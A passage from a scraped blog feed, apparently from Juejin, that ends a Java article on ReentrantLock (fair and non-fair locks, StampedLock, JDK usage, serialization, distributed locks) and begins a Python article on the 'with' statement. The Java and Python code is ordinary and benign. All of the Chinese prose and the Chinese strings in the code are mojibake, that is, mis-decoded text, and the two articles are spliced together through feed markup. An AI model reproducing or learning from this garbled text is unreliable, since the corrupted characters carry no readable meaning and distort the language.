        System.out.println(<span class="hljs-string">"éå…¬å¹³é”è€—æ—¶: "</span> + unfairTime + <span class="hljs-string">"ms"</span>);
        
        <span class="hljs-comment">// å…¬å¹³é”æµ‹è¯•</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">fairTime</span> <span class="hljs-operator">=</span> testLock(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>), threadCount, iterations);
        System.out.println(<span class="hljs-string">"å…¬å¹³é”è€—æ—¶: "</span> + fairTime + <span class="hljs-string">"ms"</span>);
        
        <span class="hljs-comment">// é€šå¸¸å…¬å¹³é”ä¼šæ…¢å¾ˆå¤š</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">testLock</span><span class="hljs-params">(ReentrantLock lock, <span class="hljs-type">int</span> threads, <span class="hljs-type">int</span> iterations)</span> 
            <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// æµ‹è¯•ä»£ç ...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šéå…¬å¹³é”é€šå¸¸æ¯”å…¬å¹³é”å¿«å¾ˆå¤šï¼ˆå¯èƒ½å¿«10å€ä»¥ä¸Šï¼‰ï¼Œé™¤éæœ‰ç‰¹æ®Šå…¬å¹³æ€§è¦æ±‚ï¼Œå¦åˆ™ä½¿ç”¨é»˜è®¤çš„éå…¬å¹³é”ã€‚</p>
<hr/>
<h3 data-id="heading-160">4. é”é€‰å‹æŒ‡å—</h3>
<h4 data-id="heading-161">4.1 é”æœºåˆ¶å¯¹æ¯”</h4>



































<table><thead><tr><th align="left">é”æœºåˆ¶</th><th align="left">ç‰¹ç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><strong>synchronized</strong></td><td align="left">ç®€å•ã€è‡ªåŠ¨é‡Šæ”¾ã€JVMä¼˜åŒ–</td><td align="left">ç®€å•åŒæ­¥ï¼Œä½ç«äº‰</td></tr><tr><td align="left"><strong>ReentrantLock</strong></td><td align="left">åŠŸèƒ½ä¸°å¯Œã€çµæ´»</td><td align="left">éœ€è¦é«˜çº§ç‰¹æ€§</td></tr><tr><td align="left"><strong>ReadWriteLock</strong></td><td align="left">è¯»å†™åˆ†ç¦»</td><td align="left">è¯»å¤šå†™å°‘</td></tr><tr><td align="left"><strong>StampedLock</strong></td><td align="left">ä¹è§‚è¯»ã€é«˜æ€§èƒ½</td><td align="left">è¯»å¤šå†™å°‘ï¼Œè¿½æ±‚æ€§èƒ½</td></tr><tr><td align="left"><strong>AtomicXxx</strong></td><td align="left">æ— é”CAS</td><td align="left">ç®€å•åŸå­æ“ä½œ</td></tr></tbody></table>
<h4 data-id="heading-162">4.2 é€‰å‹å†³ç­–æ ‘</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa700f5f57d14cce90d8daf250a0db05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=7rAsB5fvg1wD5cTcvdzzWAUoOHc%3D" alt="lock-selection-tree.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-163">4.3 ReentrantLock vs StampedLock</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * StampedLockç¤ºä¾‹ï¼ˆJDK 8+ï¼‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StampedLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">sl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> x, y;
    
    <span class="hljs-comment">// å†™é”</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">double</span> deltaX, <span class="hljs-type">double</span> deltaY)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> sl.writeLock();
        <span class="hljs-keyword">try</span> {
            x += deltaX;
            y += deltaY;
        } <span class="hljs-keyword">finally</span> {
            sl.unlockWrite(stamp);
        }
    }
    
    <span class="hljs-comment">// ä¹è§‚è¯»ï¼ˆæ— é”ï¼‰</span>
    <span class="hljs-type">double</span> <span class="hljs-title function_">distanceFromOrigin</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> sl.tryOptimisticRead();  <span class="hljs-comment">// è·å–ä¹è§‚è¯»æ ‡è®°</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">currentX</span> <span class="hljs-operator">=</span> x, currentY = y;
        
        <span class="hljs-keyword">if</span> (!sl.validate(stamp)) {  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¢«å†™å…¥</span>
            <span class="hljs-comment">// ä¹è§‚è¯»å¤±è´¥ï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»</span>
            stamp = sl.readLock();
            <span class="hljs-keyword">try</span> {
                currentX = x;
                currentY = y;
            } <span class="hljs-keyword">finally</span> {
                sl.unlockRead(stamp);
            }
        }
        
        <span class="hljs-keyword">return</span> Math.sqrt(currentX * currentX + currentY * currentY);
    }
}
</code></pre>
<p><strong>StampedLockçš„ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>ä¹è§‚è¯»ä¸é˜»å¡å†™</li>
<li>è¯»å¤šå†™å°‘æ—¶æ€§èƒ½æ›´å¥½</li>
</ul>
<p><strong>StampedLockçš„é™åˆ¶</strong>ï¼š</p>
<ul>
<li>ä¸å¯é‡å…¥</li>
<li>ä¸æ”¯æŒCondition</li>
<li>ä½¿ç”¨æ›´å¤æ‚</li>
</ul>
<h3 data-id="heading-164">5. JDKä¸­ReentrantLockçš„åº”ç”¨</h3>
<h4 data-id="heading-165">5.1 å…¸å‹åº”ç”¨åœºæ™¯</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * JDKä¸­ä½¿ç”¨ReentrantLockçš„ç±»
 */</span>

<span class="hljs-comment">// 1. ArrayBlockingQueue - æœ‰ç•Œé˜»å¡é˜Ÿåˆ—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;E&gt; {
    <span class="hljs-keyword">final</span> ReentrantLock lock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notEmpty;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notFull;
    <span class="hljs-comment">// ä½¿ç”¨ReentrantLockå®ç°put/takeçš„é˜»å¡ç­‰å¾…</span>
}

<span class="hljs-comment">// 2. LinkedBlockingQueue - é“¾è¡¨é˜»å¡é˜Ÿåˆ—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;E&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">takeLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">putLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-comment">// åŒé”æé«˜å¹¶å‘åº¦</span>
}

<span class="hljs-comment">// 3. ThreadPoolExecutor - çº¿ç¨‹æ± </span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolExecutor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">mainLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-comment">// ä¿æŠ¤workersé›†åˆçš„è®¿é—®</span>
}

<span class="hljs-comment">// 4. CyclicBarrier - å¾ªç¯å±éšœ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CyclicBarrier</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">trip</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// ä½¿ç”¨Conditionå®ç°ç­‰å¾…/å”¤é†’</span>
}

<span class="hljs-comment">// 5. PrintWriter (æŸäº›å®ç°)</span>
<span class="hljs-comment">// 6. StampedLock (å†…éƒ¨ä½¿ç”¨)</span>
</code></pre>
<h4 data-id="heading-166">5.2 ä¸ºä»€ä¹ˆè¿™äº›ç±»é€‰æ‹©ReentrantLock</h4>

























<table><thead><tr><th align="left">ç±»</th><th align="left">é€‰æ‹©ReentrantLockçš„åŸå› </th></tr></thead><tbody><tr><td align="left">ArrayBlockingQueue</td><td align="left">éœ€è¦å¤šä¸ªConditionï¼ˆnotEmpty, notFullï¼‰</td></tr><tr><td align="left">LinkedBlockingQueue</td><td align="left">éœ€è¦åˆ†ç¦»çš„é”æé«˜å¹¶å‘</td></tr><tr><td align="left">ThreadPoolExecutor</td><td align="left">éœ€è¦tryLocké¿å…æ­»é”</td></tr><tr><td align="left">CyclicBarrier</td><td align="left">éœ€è¦Conditionå®ç°ç­‰å¾…</td></tr></tbody></table>
<h3 data-id="heading-167">6. åºåˆ—åŒ–ä¸åˆ†å¸ƒå¼</h3>
<h4 data-id="heading-168">6.1 ReentrantLockä¸å¯åºåˆ—åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockçš„åºåˆ—åŒ–é—®é¢˜
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationIssue</span> {
    
    <span class="hljs-comment">// ReentrantLockæ²¡æœ‰å®ç°Serializableæ¥å£</span>
    <span class="hljs-comment">// private final ReentrantLock lock = new ReentrantLock();</span>
    
    <span class="hljs-comment">/**
     * å¦‚æœç±»éœ€è¦åºåˆ—åŒ–ï¼Œé”å­—æ®µéœ€è¦ç‰¹æ®Šå¤„ç†
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableWithLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
        
        <span class="hljs-comment">// ä½¿ç”¨transientï¼Œä¸åºåˆ—åŒ–é”</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
        
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> data;
        
        <span class="hljs-comment">// ååºåˆ—åŒ–æ—¶é‡æ–°åˆ›å»ºé”</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> 
                <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
            in.defaultReadObject();
            lock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  <span class="hljs-comment">// é‡æ–°åˆ›å»º</span>
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
            lock.lock();
            <span class="hljs-keyword">try</span> {
                data++;
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();
            }
        }
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆReentrantLockä¸å¯åºåˆ—åŒ–ï¼Ÿ</strong></p>
<ol>
<li><strong>é”çŠ¶æ€æ˜¯è¿è¡Œæ—¶çŠ¶æ€</strong>ï¼šåºåˆ—åŒ–åå†ååºåˆ—åŒ–ï¼ŒåŸæ¥çš„é”çŠ¶æ€æ²¡æœ‰æ„ä¹‰</li>
<li><strong>çº¿ç¨‹ç»‘å®š</strong>ï¼šé”ä¸ç‰¹å®šçš„çº¿ç¨‹å…³è”ï¼Œåºåˆ—åŒ–åçº¿ç¨‹å·²ä¸å­˜åœ¨</li>
<li><strong>è®¾è®¡é€‰æ‹©</strong>ï¼šDoug Leaè®¤ä¸ºé”ä¸åº”è¯¥è¢«åºåˆ—åŒ–</li>
</ol>
<h4 data-id="heading-169">6.2 åˆ†å¸ƒå¼ç¯å¢ƒçš„çº¿ç¨‹å®‰å…¨</h4>
<p><strong>ReentrantLockåªèƒ½ä¿è¯å•JVMå†…çš„çº¿ç¨‹å®‰å…¨</strong>ï¼Œåˆ†å¸ƒå¼ç¯å¢ƒéœ€è¦åˆ†å¸ƒå¼é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„é”æ–¹æ¡ˆ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLockOptions</span> {
    
    <span class="hljs-comment">/**
     * æ–¹æ¡ˆ1ï¼šåŸºäºRedisçš„åˆ†å¸ƒå¼é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">redisLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä½¿ç”¨Redisson</span>
        <span class="hljs-comment">// RLock lock = redissonClient.getLock("myLock");</span>
        <span class="hljs-comment">// lock.lock();</span>
        <span class="hljs-comment">// try { ... } finally { lock.unlock(); }</span>
    }
    
    <span class="hljs-comment">/**
     * æ–¹æ¡ˆ2ï¼šåŸºäºZooKeeperçš„åˆ†å¸ƒå¼é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">zookeeperLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä½¿ç”¨Curator</span>
        <span class="hljs-comment">// InterProcessMutex lock = new InterProcessMutex(client, "/locks/myLock");</span>
        <span class="hljs-comment">// lock.acquire();</span>
        <span class="hljs-comment">// try { ... } finally { lock.release(); }</span>
    }
    
    <span class="hljs-comment">/**
     * æ–¹æ¡ˆ3ï¼šåŸºäºæ•°æ®åº“çš„åˆ†å¸ƒå¼é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">databaseLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// SELECT ... FOR UPDATE</span>
        <span class="hljs-comment">// æˆ–ä½¿ç”¨ä¹è§‚é”ï¼ˆç‰ˆæœ¬å·ï¼‰</span>
    }
}
</code></pre>
<p><strong>åˆ†å¸ƒå¼é” vs JVMé”</strong>ï¼š</p>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ReentrantLock</th><th align="left">åˆ†å¸ƒå¼é”</th></tr></thead><tbody><tr><td align="left">ä½œç”¨èŒƒå›´</td><td align="left">å•JVM</td><td align="left">è·¨JVM/è·¨æœºå™¨</td></tr><tr><td align="left">æ€§èƒ½</td><td align="left">çº³ç§’çº§</td><td align="left">æ¯«ç§’çº§</td></tr><tr><td align="left">å¯é æ€§</td><td align="left">JVMå´©æºƒé”ä¸¢å¤±</td><td align="left">å¯è®¾ç½®è¿‡æœŸæ—¶é—´</td></tr><tr><td align="left">å¤æ‚åº¦</td><td align="left">ç®€å•</td><td align="left">éœ€è¦é¢å¤–ä¸­é—´ä»¶</td></tr><tr><td align="left">å¯é‡å…¥</td><td align="left">æ”¯æŒ</td><td align="left">å–å†³äºå®ç°</td></tr></tbody></table>
<h2 data-id="heading-170">æ€»ç»“</h2>
<p>åˆæ˜¯æ²¡æœ‰å¤§å‚çº¦é¢æ—¥å­ğŸ˜£ğŸ˜£ğŸ˜£ï¼Œå°ç¼–è¿˜åœ¨æ‰¾å®ä¹ çš„è·¯ä¸Šï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘çš„ç¬”è®°æ±‡æ€»æ•´ç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withï¼Ÿçœ‹å®Œæˆ‘æ‚Ÿäº†]]></title>    <link>https://juejin.cn/post/7580683234436464703</link>    <guid>https://juejin.cn/post/7580683234436464703</guid>    <pubDate>2025-12-08T03:03:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234436464703" data-draft-id="7580616979473186822" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withï¼Ÿçœ‹å®Œæˆ‘æ‚Ÿäº†"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T03:03:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·6854537597769"/> <meta itemprop="url" content="https://juejin.cn/user/1601315325621550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withï¼Ÿçœ‹å®Œæˆ‘æ‚Ÿäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1601315325621550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·6854537597769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:03:31.000Z" title="Mon Dec 08 2025 03:03:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§å´©æºƒçš„æƒ…å†µï¼š</p>
<pre><code class="hljs language-python" lang="python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'data.txt'</span>, <span class="hljs-string">'w'</span>)
f.write(<span class="hljs-string">'é‡è¦æ•°æ®'</span>)
<span class="hljs-comment"># ç¨‹åºåœ¨è¿™é‡Œå´©äº†ï¼Œæ–‡ä»¶æ²¡å…³é—­ï¼</span>
</code></pre>
<p>ç„¶åä½ å‘ç°æ–‡ä»¶æŸåäº†ï¼Œæ•°æ®ä¸¢äº†ï¼Œå®¢æˆ·åœ¨éª‚å¨˜ï¼Œè€æ¿åœ¨çªä½ ...</p>
<p>æ›´ç»çš„æ˜¯è¿™ç§æƒ…å†µï¼š</p>
<pre><code class="hljs language-python" lang="python">conn = sqlite3.connect(<span class="hljs-string">'database.db'</span>)
cursor = conn.cursor()
cursor.execute(<span class="hljs-string">'UPDATE users SET money = money + 1000 WHERE id = 1'</span>)
<span class="hljs-comment"># è¿™é‡ŒæŠ›å¼‚å¸¸äº†ï¼Œè¿æ¥æ²¡å…³é—­ï¼Œæ•°æ®åº“é”æ­»äº†ï¼</span>
</code></pre>
<p>æ•´ä¸ªåº”ç”¨å¡ä½ï¼Œç”¨æˆ·æŠ•è¯‰ç”µè¯è¢«æ‰“çˆ†ï¼Œä½ åœ¨å‡Œæ™¨3ç‚¹é‡å¯æœåŠ¡å™¨...</p>
<p><strong>ä»Šå¤©å’±ä»¬å°±æ¥å½»åº•ææ‡‚Pythonçš„withè¯­å¥ï¼Œè®©ä½ å‘Šåˆ«è¿™äº›èµ„æºæ³„æ¼çš„å™©æ¢¦ã€‚</strong></p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯withè¯­å¥ï¼Ÿ</h2>
<p>ç®€å•æ¥è¯´ï¼Œwithè¯­å¥å°±æ˜¯Pythonçš„"è‡ªåŠ¨ä¿å§†"ã€‚</p>
<p>å®ƒä¼šåœ¨ä½ ä½¿ç”¨èµ„æºçš„æ—¶å€™è‡ªåŠ¨æ‰“å¼€ï¼Œç”¨å®Œäº†è‡ªåŠ¨å…³é—­ï¼Œä¸­é—´å‡ºå¼‚å¸¸äº†ä¹Ÿè‡ªåŠ¨å…³é—­ã€‚</p>
<p>å°±åƒé›‡äº†ä¸ªä¿å§†ï¼Œä½ å‡ºé—¨å‰å‘Šè¯‰ä»–"å¸®æˆ‘ç…§é¡¾å­©å­"ï¼Œä½ å›å®¶æ—¶å­©å­å·²ç»è¢«å“„ç¡ç€äº†ï¼Œä¸ç®¡ä¸­é—´å­©å­æ€ä¹ˆé—¹è…¾ï¼Œä¿å§†éƒ½æå®šäº†ã€‚</p>
<h2 data-id="heading-1">æ²¡ç”¨withçš„æƒ¨ç—›æ•™è®­</h2>
<h3 data-id="heading-2">âŒ æ–°æ‰‹å†™æ³•ï¼ˆæˆ‘å½“å¹´ä¹Ÿè¿™ä¹ˆå†™è¿‡ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>)
    file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
    <span class="hljs-comment"># å¿˜è®°å…³é—­æ–‡ä»¶äº†ï¼</span>
    <span class="hljs-comment"># æ–‡ä»¶å¥æŸ„æ³„æ¼ï¼Œç³»ç»Ÿèµ„æºè¢«å ç”¨</span>
</code></pre>
<p><strong>ç»“æœï¼š</strong> æ–‡ä»¶å¯èƒ½æ²¡ä¿å­˜æˆåŠŸï¼Œå…¶ä»–ç¨‹åºæ— æ³•è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚</p>
<h3 data-id="heading-3">âŒ è¿›é˜¶å†™æ³•ï¼ˆçœ‹èµ·æ¥å¾ˆå®‰å…¨ï¼Œå®åˆ™å‘çˆ¹ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">try</span>:
        file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>)
        file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
        <span class="hljs-comment"># è¿™é‡Œå¦‚æœæŠ›å¼‚å¸¸ï¼Œfile.close()ä¸ä¼šæ‰§è¡Œï¼</span>
        <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># å‡è®¾è¿™é‡Œå‡ºå¼‚å¸¸äº†</span>
        file.close()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'å‡ºé”™äº†: <span class="hljs-subst">{e}</span>'</span>)
